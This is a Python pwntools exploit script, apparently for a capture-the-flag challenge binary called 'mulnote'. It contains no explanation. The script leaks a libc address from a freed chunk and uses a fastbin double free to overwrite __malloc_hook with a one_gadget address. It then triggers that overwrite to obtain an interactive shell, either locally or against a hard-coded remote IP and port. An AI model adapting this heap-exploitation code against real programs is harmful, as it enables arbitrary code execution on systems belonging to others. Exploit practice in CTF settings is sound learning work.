#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
local = 1
elf = ELF('./mulnote')
if local:
    p = process('./mulnote')
    libc = elf.libc
else:
    p = remote('112.126.101.96', 9999)
    libc = ELF('./libc.so')
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))

def malloc(size,content):
    ru(">")
    sl('C')
    ru("size>")
    sl(str(size))
    ru("note>") 
    sd(content)
def puts():
    ru(">")
    sl('S')
def edit(index1,content):
    ru(">")
    sl('E')
    ru("index>")
    sl(str(index1))
    ru("new note>")
    sd(content)
def free(index1):
    ru(">")
    sl('R')
    ru("index>")
    sl(str(index1))
def exit():
    ru(">")
    sl('Q')

malloc(0xC8,'AAAAAAA')
free(0)
puts()
ru("[*]note[0]:\n")
malloc_hook = u64(rc(6).ljust(8,'\x00')) - 88 - 0x10
print "malloc_hook-->" + hex(malloc_hook)
libc_base = malloc_hook - libc.symbols["__malloc_hook"]
system = libc_base + libc.symbols["system"]
free_hook = libc_base + libc.symbols["__free_hook"]
onegadget = libc_base + 0x4526a
fake_chunk = malloc_hook - 0x23 
malloc(0x68,'A'*0x68)
malloc(0x68,'B'*0x68)
malloc(0x68,'V'*0x68)
free(1)
free(3)
free(1)
malloc(0x68,p64(fake_chunk))
malloc(0x68,p64(fake_chunk))
malloc(0x68,p64(fake_chunk))
py  = ''
py += 'a'*0x13 + p64(onegadget)
malloc(0x68,py)
ru(">")
sl('C')
ru("size>")
sl('200')
p.interactive()

